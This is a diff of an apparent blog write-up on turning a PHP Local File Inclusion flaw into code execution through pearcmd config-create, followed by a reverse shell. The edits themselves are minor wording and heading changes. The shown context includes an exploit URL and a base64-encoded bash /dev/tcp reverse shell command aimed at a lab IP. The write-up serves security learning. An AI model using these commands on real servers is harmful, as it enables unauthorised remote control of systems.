@@ -14,7 +14,7 @@ This post aims to acquire knowledge about exploiting vulnerabilities in web syst
   - [Initialization](#initialization)
   - [Exploit](#exploit)
 - [Reverse Shell](#reverse-shell)
-- [Realworld](#realworld)
+- [Real World](#real-world)
 - [Mitigation](#mitigation)
 - [References](#references)
 
@@ -90,7 +90,7 @@ We can verify that an array is created in $_SERVER["argv"].
 
 ![php info](phpinfo_argv.png "PHP Info")
 
-Following the post from [@phithon_xg](https://twitter.com/phithon_xg) it is possible, from the phpinfo file, to invoke an action to create pearcmd files. This "pearcmd" is a PHP script that is used to interact with PEAR, a repository of PHP extensions and applications. It is used to install, uninstall, update, and manage PEAR packages. For this PoC, we will use the config-create function. 
+Following the post from [@phithon_xg](https://twitter.com/phithon_xg) it is possible, from the index.php file, to invoke an action from pearcmd and cerate files. This "pearcmd" is a PHP script that is used to interact with PEAR, a repository of PHP extensions and applications. It is used to install, uninstall, update, and manage PEAR packages. For this PoC, we will use the config-create function. 
 
 ![pearcmd](pearcmd_config-create.png "pearcmd config-cerate")
 
@@ -148,7 +148,7 @@ URL: `http://192.168.1.202:8080/index.php?file=/tmp/h4ndsh.php&cmd=id`
 
 # Reverse Shell
 
-In a scenario where a server allows the injection of Unix commands, such as through vulnerabilities like Local File Inclusion (LFI) or Remote Code Execution (RCE), it becomes possible to send a specific command to establish a reverse shell. A reverse shell is a connection initiated from the compromised server to the attacker's machine, providing the attacker with control over the server. To achieve this, the author plans to modify a previously used Python3 script to inject a command that opens a reverse shell on their own computer. For ease of use, the reverse shell command is encoded in base64, with the IP address "192.168.1.110" and port "2030" specified as the connection destination.
+In a scenario where a server allows the injection of Unix commands, such as through vulnerabilities like Local File Inclusion (LFI) or Remote Code Execution (RCE), it becomes possible to send a specific command to establish a reverse shell. A reverse shell is a connection initiated from the compromised server to the attacker's machine, providing the attacker with control over the server. To achieve this, I modify a previously used Python3 script to inject a command that opens a reverse shell on their own computer. For ease of use, the reverse shell command is encoded in base64, with the IP address "192.168.1.110" and port "2030" specified as the connection destination.
 
 ```bash
 echo 'bash -c "sh -i >& /dev/tcp/192.168.1.110/2030 0>&1"' | base64 -w 0
@@ -204,7 +204,7 @@ And we successfully establish a connection.
 ![reverse shell](netcat_connection.png "Reverse Shell")
 
 
-# Realworld
+# Real World
 
 This detection does not necessarily imply that the web service is vulnerable. As mentioned earlier, the presence of a Local File Inclusion (LFI) vulnerability is required for the successful execution of the process outlined above, and each case may vary. However, to identify systems running PHP versions <= 7.3, we can utilize [nuclei](https://github.com/projectdiscovery/nuclei). This tool is capable of scanning for various vulnerabilities, including Remote Code Execution (RCE), SQL injection, and cross-site scripting (XSS), providing us with insights into potential security risks.
 
